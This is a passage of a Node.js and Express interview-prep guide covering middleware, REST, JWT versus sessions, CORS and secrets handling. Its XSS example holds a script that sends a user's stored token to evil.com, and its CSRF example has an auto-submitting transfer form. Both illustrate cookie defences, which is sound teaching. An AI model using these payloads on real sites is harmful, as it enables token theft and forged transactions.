- Must have exactly 4 arguments (Express identifies error handlers this way — 3 args = treated as regular middleware)
- Must be registered last — after all routes and middleware

```js
// Trigger it anywhere upstream
app.get('/user', (req, res, next) => {
  const err = new Error('User not found');
  err.status = 404;
  next(err); // passing anything truthy to next() skips to error handler
});

// Catches it here — 4 args, registered last
app.use((err, req, res, next) => {
  res.status(err.status || 500).json({ error: err.message });
});
```

**Order matters — the most common Express bug:**

```js
// ❌ Auth never runs for /private — defined before the middleware
app.get('/private', handler);
app.use(authMiddleware);   // too late

// ✅ Middleware only applies to routes registered AFTER it
app.use(authMiddleware);
app.get('/private', handler);
```

**Route-level middleware — the scalable pattern:**

```js
const auth = (req, res, next) => {
  if (!req.headers.authorization) return next(new AppError('Unauthorized', 401));
  next();
};

// Protection is explicit per route — not dependent on file order
app.post('/login', loginHandler);                  // public
app.get('/dashboard', auth, dashboardHandler);     // protected
app.get('/profile', auth, profileHandler);         // protected
app.use(errorHandler);                             // always last
```

### 8.4 Error Handling

**Two categories:**

```
Synchronous errors   → Express catches automatically
Asynchronous errors  → You must catch and forward via next(err)
```

```js
// Synchronous — auto-caught
app.get('/user', (req, res, next) => {
  throw new Error('Something broke'); // Express wraps sync handlers
});

// ❌ Async Express 4 — NOT caught automatically — can crash the process
app.get('/user', async (req, res, next) => {
  const user = await db.findUser(id); // throws — nobody catches this
  res.json(user);
});

// ✅ Async Express 4 — catch and forward
app.get('/user', async (req, res, next) => {
  try {
    const user = await db.findUser(id);
    res.json(user);
  } catch (err) {
    next(err); // forwards to error handler
  }
});
```

> Express 5 catches async errors automatically. Know Express 4 behavior for interviews.

**What you should never do:**

```js
// ❌ Expose stack traces to the client — leaks internals
res.status(500).json({ error: err.stack });

// ❌ Swallow errors silently
try {
  await doSomething();
} catch (err) {
  // nothing here — production debugging nightmare
}

// ❌ Send response AND call next(err) — headers already sent, this crashes
res.json({ ok: true });
next(err);
```

---

## 9. REST API Design

REST is an architectural style, not a protocol. Everything is a resource (noun).
You act on resources using HTTP verbs. URIs identify resources — never actions.

### 9.1 HTTP Verbs

| Verb | Purpose | Idempotent? | Safe? |
|---|---|---|---|
| `GET` | Retrieve a resource | ✅ Yes | ✅ Yes |
| `POST` | Create a new resource | ❌ No | ❌ No |
| `PUT` | Replace resource entirely | ✅ Yes | ❌ No |
| `PATCH` | Partially update resource | ❌ No | ❌ No |
| `DELETE` | Remove a resource | ✅ Yes | ❌ No |
| `HEAD` | Check resource without downloading body | ✅ Yes | ✅ Yes |
| `OPTIONS` | Get available methods | ✅ Yes | ✅ Yes |

**Idempotent** — calling it multiple times produces the same result as calling it once.
**Safe** — calling it produces no side effects on the server.

**PUT vs PATCH — the interview trap:**

```
PUT /users/1
{ "name": "Ahmed", "email": "ahmed@mail.com", "role": "admin" }
→ Replaces the ENTIRE resource. Missing fields get nulled out.

PATCH /users/1
{ "name": "Ahmed" }
→ Updates ONLY the fields you send. Everything else is untouched.

Sending a PUT with partial data silently wipes fields — a real production bug.
```

### 9.2 Resource Naming Rules

```
✅ Nouns, not verbs
GET /users              not  GET /getUsers
POST /users             not  POST /createUser
DELETE /users/1         not  DELETE /deleteUser?id=1

✅ Plural nouns for collections
/users                  not  /user
/posts                  not  /post

✅ Hierarchy for relationships
GET /users/1/posts          → posts belonging to user 1
GET /users/1/posts/5        → specific post by user 1

✅ IDs in the path — query strings are for filtering collections
GET /users/1/posts/5                    → identify a specific resource
GET /users/1/posts?status=published     → filter a collection

✅ Lowercase, hyphen-separated
/blog-posts             not  /blogPosts or /blog_posts

❌ Never verbs in URIs
/users/1/getPosts       ← wrong
/users/1/posts          ← correct
```

### 9.3 Status Codes

```
2xx — Success
  200 OK              → general success (GET, PUT, PATCH)
  201 Created         → resource created (POST)
  204 No Content      → success, nothing to return (DELETE)

4xx — Client Error
  400 Bad Request     → malformed input, validation failure
  401 Unauthorized    → not authenticated (no token / invalid / expired)
  403 Forbidden       → authenticated but not permitted
  404 Not Found       → resource doesn't exist
  409 Conflict        → duplicate resource, state conflict
  422 Unprocessable   → valid syntax, failed business rules

5xx — Server Error
  500 Internal Server Error  → generic server failure
  503 Service Unavailable    → server down or overloaded
```

**401 vs 403 — always asked, always confused:**

```
401 — "I don't know who you are"
      No token / invalid token / expired token

403 — "I know who you are, you just can't do this"
      Valid token, but insufficient permissions

These are NOT interchangeable. Returning 401 when you mean 403 leaks information
about your auth system.
```

### 9.4 API Versioning

**Approach A — URI Versioning (most common in practice)**
```
/api/v1/users
/api/v2/users
```
Pros: explicit, easy to route, cacheable, visible in browser
Cons: version isn't technically a resource property — REST purists object

**Approach B — Header Versioning**
```
Accept: application/vnd.myapi.v2+json
```
Pros: clean URIs
Cons: harder to test, not visible in the browser

**Approach C — Query Parameter**
```
/api/users?version=2
```
Pros: simple
Cons: easily forgotten, hard to enforce

For a junior interview — know URI versioning deeply, mention the others exist.

---

## 10. Mongoose

### 10.1 Setup

```bash
npm install mongoose
```

```js
const mongoose = require('mongoose');

mongoose.connect('mongodb://127.0.0.1:27017/inventory-system')
  .then(() => console.log('MongoDB connected'))
  .catch(err => console.error('Connection error:', err));
```

### 10.2 Schema & Unique Index Notes

```js
const itemSchema = new mongoose.Schema({
  name: {
    type: String,
    required: true,
    trim: true
  },
  sku: {
    type: String,
    unique: true   // Mongoose creates a unique index in MongoDB
  }
});
```

**Critical notes on `unique: true`:**

- It is NOT a Mongoose validator — it's a MongoDB index instruction
- Mongoose offloads uniqueness to MongoDB's indexing engine to avoid race conditions
- When a duplicate is saved, MongoDB throws an `E11000` driver-level error — not a Mongoose validation error
- Always handle `E11000` explicitly in your error handler:

```js
app.use((err, req, res, next) => {
  if (err.code === 11000) {
    return res.status(409).json({ error: 'Duplicate value — already exists' });
  }
  res.status(err.status || 500).json({ error: err.message });
});
```

- In production, set `autoIndex: false` and manage indexes via the MongoDB shell
- When you drop a collection locally, **restart nodemon** — indexes won't recreate until restart, silently bypassing the unique constraint

---

## 11. JWT vs Sessions

### 11.1 How Sessions Work

The server owns the truth. A session record is stored server-side. The client carries
only an opaque ID in a cookie.

```
Client                          Server                    Session Store
  |                               |                            |
  |  POST /login                  |                            |
  |-----------------------------> |                            |
  |                               |  CREATE session record     |
  |                               |--------------------------> |
  |  Set-Cookie: sessionId=abc123 |                            |
  | <---------------------------- |                            |
  |                               |                            |
  |  GET /dashboard               |                            |
  |  Cookie: sessionId=abc123     |                            |
  |-----------------------------> |                            |
  |                               |  LOOKUP sessionId=abc123   |
  |                               |--------------------------> |
  |                               |  { userId: 1, role: admin }|
  |                               | <------------------------- |
  |  200 OK                       |                            |
  | <---------------------------- |                            |
```

**Pros:** Instant invalidation, server controls everything, small cookie (just an ID)
**Cons:** Requires shared session store (Redis) at scale, DB lookup on every request

**Why Redis over a database for sessions:**

```
PostgreSQL session lookup  →  ~5–20ms  (disk I/O)
Redis session lookup       →  ~0.1ms   (in-memory)

10,000 concurrent users × 10 requests/min = 100,000 session lookups/min
— just for auth, before any business logic queries
At 5ms per lookup: 500 seconds of DB time per minute — just for auth
```

### 11.2 How JWT Works

The client owns the token. The server signs it on login and verifies the signature
on every request — no DB lookup needed.

```
Client                          Server
  |                               |
  |  POST /login                  |
  |-----------------------------> |
  |                               |  Sign token with secret key
  |  { token: "eyJhb..." }        |
  | <---------------------------- |
  |                               |
  |  GET /dashboard               |
  |  Authorization: Bearer eyJhb..|
  |-----------------------------> |
  |                               |  Verify signature — no DB lookup
  |                               |  Decode payload → { userId: 1 }
  |  200 OK                       |
  | <---------------------------- |
```

**Pros:** Stateless, scales horizontally, no session store needed
**Cons:** Hard to invalidate, payload size grows with data, secret key management critical

### 11.3 JWT Structure

```
eyJhbGciOiJIUzI1NiJ9  .  eyJ1c2VySWQiOjF9  .  SflKxwRJSMeKKF2QT4fwpMeJf36P
      Header                   Payload              Signature
  (algorithm, type)    (your data — readable)   (HMAC of header + payload)
```

Each part is Base64URL encoded — **NOT encrypted**. Payload is readable by anyone.

```js
// Payload decoded — visible to anyone who has the token
{
  "userId": 1,
  "role": "admin",
  "exp": 1716239022   // expiration timestamp
}
```

**JWT is signed, not encrypted. Never put sensitive data in the payload.**

**Can the secret key be extracted from the JWT?**
No. HMAC is a one-way function — you can verify with the key, but cannot reverse
the signature to get the key back. The risk is key theft (e.g. from a leaked `.env`),
not extraction from the token.

### 11.4 JWT Size — Concrete Impact

```js
// Minimal payload → ~120 bytes per request
{ "userId": 1 }

// Typical payload → ~280 bytes per request
{ "userId": 1, "role": "admin", "email": "ahmed@co.com", "orgId": 42 }

// Bloated payload → ~520 bytes per request
{
  "userId": 1, "role": "admin", "email": "ahmed@co.com",
  "firstName": "Ahmed", "lastName": "Hassan",
  "permissions": ["read:users", "write:users", "delete:users"],
  "orgId": 42, "orgName": "Acme Corp", "locale": "en-US"
}

// Impact: 1,000 users × 100 requests/day × 520 bytes = ~52MB/day in headers alone
// Sessions: cookie is always ~30 bytes regardless of how much data is in the session
```

### 11.5 JWT Implementation in Express

```js
const jwt = require('jsonwebtoken');

// On login — sign a token
const token = jwt.sign(
  { userId: 1, role: 'admin' },   // payload — keep it minimal
  process.env.JWT_SECRET,          // secret key — never hardcode
  { expiresIn: '15m' }            // short expiry — always
);

// Auth middleware — verify on every protected request
const auth = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1]; // "Bearer <token>"
  if (!token) return next(new AppError('No token', 401));

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded; // attach payload to request
    next();
  } catch (err) {
    next(new AppError('Invalid or expired token', 401));
  }
};
```

### 11.6 The Invalidation Problem

With sessions:
```
Account compromised → DELETE session record → user locked out instantly
Server owns the truth — no token needed from the client
```

With JWT:
```
Account compromised → token is still cryptographically valid until expiry
Client owns the token — you cannot reach into their browser and take it back
```

**Three real solutions:**

**Option 1 — Blacklist by `jti` claim**
```js
// Every token gets a unique ID at signing time
const token = jwt.sign(
  { userId: 1, jti: uuid() },   // unique token identifier
  process.env.JWT_SECRET,
  { expiresIn: '15m' }
);

// On compromise:
// → Store that jti in Redis with TTL matching token expiry
// → On every request, check if jti is blacklisted before trusting the token
// → You never need the token itself — just the ID you assigned at sign time
// Tradeoff: Redis lookup per request — you're stateful again
```

**Option 2 — Short expiry + refresh token rotation**
```
Access token  → 15 minutes, JWT, stateless
Refresh token → 7 days, opaque string, stored server-side in DB/Redis

On compromise:
→ Delete the refresh token record from the DB
→ Access token expires naturally in max 15 minutes
→ Attacker cannot get a new access token — refresh is dead
Tradeoff: up to 15 minute exposure window after compromise is reported
```

**Option 3 — Token versioning**
```js
// Users table has a tokenVersion column (integer, starts at 0)
// JWT payload carries the version it was issued with
{ userId: 1, tokenVersion: 3 }

// On every request — compare versions
if (decoded.tokenVersion !== user.tokenVersion) {
  return next(new AppError('Token has been revoked', 401));
}

// On compromise — increment the version
// UPDATE users SET tokenVersion = 4 WHERE id = 1
// → All existing tokens instantly invalid (wrong version number)
// Tradeoff: one DB lookup per request — but you're already doing that in most apps
```

### 11.7 Token Storage — Client Side

| Storage | XSS Risk | CSRF Risk | Notes |
|---|---|---|---|
| `localStorage` | 🔴 High | ✅ None | JS can read it — XSS steals token |
| `httpOnly` Cookie | ✅ None | 🔴 High | JS can't read — browser auto-sends |
| `httpOnly` + `SameSite=Strict` | ✅ None | ✅ Mitigated | Best default choice |
| Memory (JS variable) | ✅ None | ✅ None | Lost on page refresh — poor UX |

**Best practice:**
```
Set-Cookie: token=...; HttpOnly; SameSite=Strict; Secure

HttpOnly        → JS cannot read the cookie — XSS safe
SameSite=Strict → browser won't send cookie on cross-site requests — CSRF mitigated
Secure          → cookie only sent over HTTPS
```

### 11.8 XSS & CSRF Explained

**XSS — Cross-Site Scripting**

Attacker injects malicious JavaScript into your page that runs in other users' browsers.

```js
// Attacker posts this as a comment — your server stores it
<script>
  fetch('https://evil.com/steal?token=' + localStorage.getItem('jwt'));
</script>

// Every user who loads the page runs this script — their token is sent to the attacker
// httpOnly cookie — JavaScript cannot access it at all — XSS finds nothing to steal
```

**CSRF — Cross-Site Request Forgery**

Attacker tricks your browser into making a request to another site using your cookies.

```html
<!-- On evil.com — executes silently when victim visits -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="amount" value="10000"/>
  <input name="to" value="attacker_account"/>
</form>
<script>document.getElementById('f').submit();</script>

<!-- Browser automatically sends bank.com session cookies — transfer executes -->
<!-- Fix: SameSite=Strict tells the browser not to send cookies cross-site -->
```

### 11.9 The Core Tradeoff

| | Sessions | JWT |
|---|---|---|
| **State** | Stateful — server stores session | Stateless — client carries token |
| **Scalability** | Needs shared store (Redis) | Scales horizontally out of the box |
| **Invalidation** | Instant — delete the record | Hard — wait for expiry or add state |
| **DB lookup per request** | Yes — session store lookup | No — signature verification only |
| **Sensitive data** | Safe in session store | Never in payload — it's readable |
| **Best for** | Apps needing instant revocation | Microservices, horizontal scaling |

---

## 12. CORS

### 12.1 The Same-Origin Policy

Browsers enforce a rule: a page can only make requests to the same origin it was
served from — unless the server explicitly allows otherwise.

```
Origin = protocol + domain + port

https://myapp.com:443    ← origin
http://myapp.com:443     ← different (protocol changed)
https://api.myapp.com    ← different (subdomain changed)
https://myapp.com:3000   ← different (port changed)
```

**CORS is not a server-side security mechanism.**
**CORS is a browser-side enforcement mechanism, controlled by server headers.**

curl and Postman ignore CORS entirely — it's purely a browser concern.

### 12.2 Simple vs Preflight Requests

**Simple requests — no preflight:** Requests that meet ALL of these conditions:
- Method is GET, POST, or HEAD
- Content-Type is `text/plain`, `application/x-www-form-urlencoded`, or `multipart/form-data`
- No custom headers (no `Authorization`, no custom `X-` headers)

```
Browser → GET https://api.myapp.com/users
          Origin: https://app.myapp.com

Server  → 200 OK
          Access-Control-Allow-Origin: https://app.myapp.com

Browser → Origin matches — JS can read the response ✅
```

**Preflight — triggered by:** DELETE, PATCH, PUT, `Authorization` header,
`Content-Type: application/json`

```
Browser                          Express Server
   |                                  |
   |  OPTIONS /items/4                |
   |  Origin: https://app.myapp.com   |
   |  Access-Control-Request-Method:  |
   |    DELETE                        |
   |  Access-Control-Request-Headers: |
   |    Authorization, Content-Type   |
   | -------------------------------->|
   |                                  |
   |  204 No Content                  |
   |  Access-Control-Allow-Origin:    |
   |    https://app.myapp.com         |
   |  Access-Control-Allow-Methods:   |
   |    GET,POST,PUT,PATCH,DELETE     |
   |  Access-Control-Allow-Headers:   |
   |    Authorization, Content-Type   |
   |  Access-Control-Max-Age: 86400   |  ← caches preflight for 24 hours
   | <--------------------------------|
   |                                  |
   |  DELETE /items/4                 |  ← actual request now sent
   |  Authorization: Bearer eyJ...    |
   | -------------------------------->|
   |                                  |
   |  200 OK                          |
   | <--------------------------------|
```

### 12.3 CORS in Express

```js
const cors = require('cors');

// ❌ Never in production — allows every origin on the internet
app.use(cors());

// ✅ Explicit whitelist
app.use(cors({
  origin: ['https://app.myapp.com', 'https://admin.myapp.com'],
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,    // allow cookies to be sent cross-origin
  maxAge: 86400         // cache preflight response for 24 hours
}));

// ❌ Invalid combination — browser rejects this
app.use(cors({ origin: '*', credentials: true }));
// Wildcard + credentials is not allowed — must specify exact origin

// ✅ Dynamic whitelist with dev support
const allowedOrigins = [
  'https://app.myapp.com',
  ...(process.env.NODE_ENV === 'development' ? ['http://localhost:3000'] : [])
];

app.use(cors({
  origin: (requestOrigin, callback) => {
    if (!requestOrigin) return callback(null, true); // allow curl, Postman
    if (allowedOrigins.includes(requestOrigin)) callback(null, true);
    else callback(new Error('Not allowed by CORS'));
  },
  credentials: true,
  maxAge: 86400
}));
```

**Common mistakes:**

```js
// ❌ CORS registered after routes — OPTIONS preflight fails for those routes
app.use('/api', router);
app.use(cors());          // too late

// ✅ Always register CORS before routes
app.use(cors(corsOptions));
app.use('/api', router);
```

### 12.4 CORS Headers Reference

| Header | Direction | Purpose |
|---|---|---|
| `Origin` | Request → Server | Where the request is coming from |
| `Access-Control-Allow-Origin` | Server → Browser | Which origins are allowed |
| `Access-Control-Allow-Methods` | Server → Browser | Which HTTP methods are allowed |
| `Access-Control-Allow-Headers` | Server → Browser | Which request headers are allowed |
| `Access-Control-Allow-Credentials` | Server → Browser | Whether cookies can be sent |
| `Access-Control-Max-Age` | Server → Browser | How long to cache the preflight (seconds) |

---

## 13. Environment Config & Secrets

### 13.1 The Problem — Hardcoded Secrets

```js
// ❌ Never do this — these strings are in Git history forever
const db     = mongoose.connect('mongodb+srv://admin:mypassword123@cluster.net/db');
const token  = jwt.sign(payload, 'my_super_secret_key');
const stripe = new Stripe('sk_live_abc123realkey');
```

Even if you delete them in the next commit, they are recoverable:

```bash
git log --all                    # shows all commits including "deleted" ones
git show <original_commit_hash>  # secret visible in plain text
```

**Treat any secret that touched a commit as fully compromised.**

### 13.2 The Solution — Environment Variables

```js
// ✅ Reference the variable — never the value
const db     = mongoose.connect(process.env.MONGODB_URI);
const token  = jwt.sign(payload, process.env.JWT_SECRET);
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY);
```

```bash
# .env — gitignored, local dev only
MONGODB_URI=mongodb+srv://admin:mypassword123@cluster.net/db
JWT_SECRET=a_long_random_unguessable_string_minimum_32_chars
STRIPE_SECRET_KEY=sk_live_abc123realkey
PORT=3000
NODE_ENV=development
```

```js
// First line of app.js — always
require('dotenv').config();
```

```bash
# .env.example — committed to git, structure only, no values
MONGODB_URI=
JWT_SECRET=
STRIPE_SECRET_KEY=
PORT=
NODE_ENV=
```

**In production — never use `.env` files.** The hosting platform injects variables
at runtime. Your code is identical in all environments — `process.env.JWT_SECRET` just
works wherever it runs.

| Platform | Where Secrets Live |
|---|---|
| AWS | Secrets Manager / Parameter Store |
| Heroku | Config Vars in dashboard |
| Railway / Render | Environment Variables in dashboard |
| Docker | `--env-file` or Docker Secrets |
| Kubernetes | Kubernetes Secrets |

### 13.3 Fail Fast Validation

```js
// config/env.js — import before anything else in app.js
const required = ['MONGODB_URI', 'JWT_SECRET', 'STRIPE_SECRET_KEY'];

required.forEach(key => {
  if (!process.env[key]) {
    throw new Error(`Missing required environment variable: ${key}`);
    // Crashes at boot with a clear message — far better than
    // a cryptic failure two hours into production
  }
});

module.exports = {
  mongoUri:  process.env.MONGODB_URI,
  jwtSecret: process.env.JWT_SECRET,
  stripeKey: process.env.STRIPE_SECRET_KEY,
  port:      process.env.PORT || 3000,
  isProd:    process.env.NODE_ENV === 'production'
};
```

**NODE_ENV — gates environment-specific behavior:**

```js
// Different error verbosity per environment
if (process.env.NODE_ENV === 'production') {
  app.use((err, req, res, next) => {
    res.status(err.status || 500).json({ error: err.message }); // no stack trace
  });
} else {
  app.use((err, req, res, next) => {
    res.status(err.status || 500).json({
      error: err.message,
      stack: err.stack         // full trace in development only
    });
  });
}
```

### 13.4 Secret Compromised — Remediation Order

```
1. ROTATE THE SECRET IMMEDIATELY — first, always
   → Stripe / Cloudinary / AWS → regenerate / roll the key
   → Old key is dead — attacker's window closes the moment you rotate
   → Do this BEFORE touching Git

2. Update the new secret in your hosting platform
   → Not in code — in the secret manager / environment config

3. Clean Git history (housekeeping — after rotation)
   → BFG Repo Cleaner or git filter-branch
   → Force push to rewrite remote history
   → All team members must re-clone

4. Audit access logs
   → Did anyone use the exposed key during the exposure window?
   → Stripe, Cloudinary, AWS all have API access logs

5. Add prevention tooling going forward
   → GitHub secret scanning — built-in, alerts before push reaches remote
   → git-secrets pre-commit hook — blocks commits containing secret patterns
```

**Rotation is the fix. History cleanup is housekeeping.**

---

## 14. Compiler vs Interpreter vs JIT

| | AOT Compiler | Interpreter | JIT |
|---|---|---|---|
| **When translated** | Before execution | Line by line at runtime | On hot paths at runtime |
| **Output** | Binary executable | No file | Native code in memory |
| **Startup speed** | Slow | Fast | Fast |
| **Peak speed** | Fastest | Slowest | Near-compiled |
| **Errors detected** | All upfront | Stops at first error | Stops at first error |
| **Portability** | Platform-specific | High (needs runtime) | High (needs runtime) |
| **Memory** | Low at runtime | Low | High (profiler + compiler live alongside) |
| **Examples** | C, C++, Rust, Go | CPython, Ruby, Bash | Java (JVM), JS (V8), C# (.NET) |

**Speed over time:**

```
Speed
  |                          ___________  AOT — fastest from the start
  |                    _____/
  |              _____/                   JIT — catches up after warm-up
  |        _____/
  |_______/                               Interpreter — never catches up
  |
  +-------------------------------------------> Time / Warm-up
```

**How modern languages actually work:**

| Language | What actually happens |
|---|---|
| **JavaScript (V8)** | Interpreted by Ignition → Turbofan JIT compiles hot paths |
| **Java** | Compiled to bytecode → JVM interprets → JIT compiles hot paths |
| **Python (CPython)** | Compiled to `.pyc` bytecode → then interpreted line by line |
| **C#** | Compiled to IL bytecode → .NET CLR JITs it at runtime |
| **PyPy** | Full JIT for Python — often 5–10× faster than CPython |

---
## 15. The Problem With One Node Process
Before scaling, you need to understand why one server struggles:
Node is single-threaded — one process uses ONE CPU core
A modern server has 8, 16, 32 cores
Running one Node process = wasting 90%+ of your hardware
So the first move isn't always "get another server" — it's use the server you have fully first.

The Scaling Ladder — In Order
Level 1 — Use all cores on the machine you have (Clustering)
jsconst cluster = require('cluster');
const os = require('os');

if (cluster.isPrimary) {
  const cpus = os.cpus().length; // e.g. 8 cores
  for (let i = 0; i < cpus; i++) {
    cluster.fork(); // spawn 8 Node processes
  }
} else {
  require('./app'); // each worker runs the full app
}
Or use PM2 — simpler, production-ready:
bashpm2 start app.js -i max   # spawns one process per CPU core automatically



## 16. Interview-Ready Summaries

**Event Loop:**
> "Node runs JavaScript on a single thread using V8. It achieves concurrency through
> an event-driven non-blocking I/O model powered by libuv. libuv implements the event
> loop, which processes callbacks in fixed phases — timers, pending callbacks, poll,
> check, close. Slow operations are offloaded to libuv's thread pool or OS async APIs.
> The main thread is never blocked waiting — it's always processing the next callback."

**Async Patterns:**
> "Callbacks were Node's original primitive but didn't scale — error handling was manual
> at every nesting level. Promises centralized error handling with .catch() and made
> chaining possible. async/await is syntactic sugar over Promises that reads like
> synchronous code. The key trap is using sequential awaits on independent operations —
> that should be Promise.all, which runs them in parallel."

**Express Middleware:**
> "Middleware are functions with access to req, res, and next. They execute in the order
> they're defined. next() passes control forward — next(err) skips to the error handler.
> Error handlers are identified by their 4-argument signature and must be registered last.
> Order is critical — middleware only applies to routes registered after it."

**REST API:**
> "REST is built around resources and a uniform interface. URIs are nouns, never verbs.
> HTTP verbs carry semantic contracts — GET is safe and idempotent, POST creates, PUT
> replaces entirely, PATCH updates partially. Status codes must be precise — 401 means
> unauthenticated, 403 means unauthorized, they are not interchangeable."

**JWT vs Sessions:**
> "Sessions are stateful — server stores session data, client carries only an ID. Easy
> to invalidate but requires Redis at scale. JWT is stateless — server signs a token,
> client carries it, server verifies signature with no DB lookup. JWT scales easily but
> has a hard invalidation problem. For apps needing instant revocation, sessions with
> Redis are simpler and safer."

**CORS:**
> "CORS exists because browsers enforce the same-origin policy. CORS lets servers relax
> this selectively through response headers. Simple requests skip the preflight. Requests
> with DELETE or custom headers like Authorization trigger an OPTIONS preflight first.
> cors() handles preflights automatically. Always whitelist specific origins — never use
> a wildcard, and wildcard cannot be used with credentials."

**Environment Config:**
> "Secrets should never be hardcoded or committed to source control. Environment variables
> keep config separate from code. Locally, dotenv loads a gitignored .env file. In
> production, the hosting platform injects variables at runtime. Validate all required
> variables at startup and fail fast. If a secret is committed, rotate it immediately —
> history rewriting alone is not the fix."

---

## 17. References

| Topic | Link |
|---|---|
| Node.js Event Loop | https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick |
| libuv Design Overview | https://docs.libuv.org/en/v1.x/design.html |
| libuv Thread Pool | https://docs.libuv.org/en/v1.x/threadpool.html |
| UV_THREADPOOL_SIZE | https://nodejs.org/api/cli.html#uv_threadpool_sizesize |
| Node DNS Docs | https://nodejs.org/api/dns.html#implementation-considerations |
| process.nextTick vs setImmediate | https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick#process-nexttick-vs-setimmediate |
| MDN — Async JavaScript | https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Asynchronous |
| MDN — Promise | https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise |
| MDN — Promise.all | https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/all |
| MDN — Promise.allSettled | https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/allSettled |
| MDN — Promise static methods | https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise#static_methods |
| MDN — Microtask Guide | https://developer.mozilla.org/en-US/docs/Web/API/HTML_DOM_API/Microtask_guide |
| Express — Using Middleware | https://expressjs.com/en/guide/using-middleware.html |
| Express — Writing Middleware | https://expressjs.com/en/guide/writing-middleware.html |
| Express — Error Handling | https://expressjs.com/en/guide/error-handling.html |
| Express 5 — Migration Guide | https://expressjs.com/en/guide/migrating-5.html |
| MDN — HTTP Methods | https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods |
| RFC 9110 — HTTP Semantics | https://www.rfc-editor.org/rfc/rfc9110#section-9 |
| RFC 5789 — PATCH Method | https://www.rfc-editor.org/rfc/rfc5789 |
| REST Resource Naming | https://restfulapi.net/resource-naming/ |
| MDN — HTTP Status Codes | https://developer.mozilla.org/en-US/docs/Web/HTTP/Status |
| MDN — Custom Error Types | https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error#custom_error_types |
| REST — Fielding's Dissertation | https://ics.uci.edu/~fielding/pubs/dissertation/rest_arch_style.htm |
| API Versioning — Microsoft Guidelines | https://github.com/microsoft/api-guidelines/blob/vNext/azure/Guidelines.md#api-versioning |
| JWT Introduction | https://jwt.io/introduction |
| RFC 7519 — JSON Web Token | https://www.rfc-editor.org/rfc/rfc7519 |
| RFC 8725 — JWT Best Practices | https://www.rfc-editor.org/rfc/rfc8725 |
| jsonwebtoken — npm | https://www.npmjs.com/package/jsonwebtoken |
| Auth0 — Refresh Tokens | https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/ |
| Express Session Middleware | https://expressjs.com/en/resources/middleware/session.html |
| connect-redis | https://www.npmjs.com/package/connect-redis |
| Redis — Why In-Memory | https://redis.io/docs/about/ |
| OWASP — XSS | https://owasp.org/www-community/attacks/xss/ |
| OWASP — CSRF | https://owasp.org/www-community/attacks/csrf |
| MDN — httpOnly Cookie | https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#httponly |
| MDN — SameSite | https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite |
| MDN — Same-Origin Policy | https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy |
| MDN — CORS | https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS |
| MDN — Preflight Requests | https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request |
| MDN — Simple Requests | https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests |
| MDN — CORS Headers | https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#the_http_response_headers |
| Express CORS Middleware | https://expressjs.com/en/resources/middleware/cors.html |
| dotenv — npm | https://www.npmjs.com/package/dotenv |
| Twelve-Factor App — Config | https://12factor.net/config |
| OWASP — Sensitive Data Exposure | https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure |
| GitHub — Secret Scanning | https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning |
| BFG Repo Cleaner | https://rtyley.github.io/bfg-repo-cleaner/ |
| git-secrets — AWS Labs | https://github.com/awslabs/git-secrets |
| V8 Engine | https://v8.dev/docs |
| Node Streams | https://nodejs.org/api/stream.html |
| Node Cluster Module | https://nodejs.org/api/cluster.html |
| libuv TCP Handle | https://docs.libuv.org/en/v1.x/tcp.html |



